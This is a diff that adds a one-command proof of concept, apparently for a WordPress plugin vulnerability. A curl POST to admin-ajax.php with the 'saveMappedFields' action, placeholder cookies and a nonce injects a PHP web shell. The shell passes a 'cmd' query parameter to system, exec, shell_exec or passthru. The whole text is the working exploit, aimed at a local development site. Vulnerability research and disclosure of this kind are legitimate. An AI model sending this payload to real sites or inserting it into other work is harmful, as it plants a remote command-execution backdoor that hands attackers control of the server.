@@ -1,0 +1,6 @@
+curl -X POST "http://nxk.ddev.site/wp-admin/admin-ajax.php" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -H "Cookie: COOKIES" \
+  --data-urlencode "action=saveMappedFields" \
+  --data-urlencode "securekey=NONCE" \
+  --data-urlencode "MappedFields={\"pwn->cus2\":\"<?php \$cmd=\$_GET['cmd']; if(function_exists('system')){ system(\$cmd); } elseif(function_exists('exec')){ echo exec(\$cmd); } elseif(function_exists('shell_exec')){ echo shell_exec(\$cmd); } elseif(function_exists('passthru')){ passthru(\$cmd); } ?>\"}"
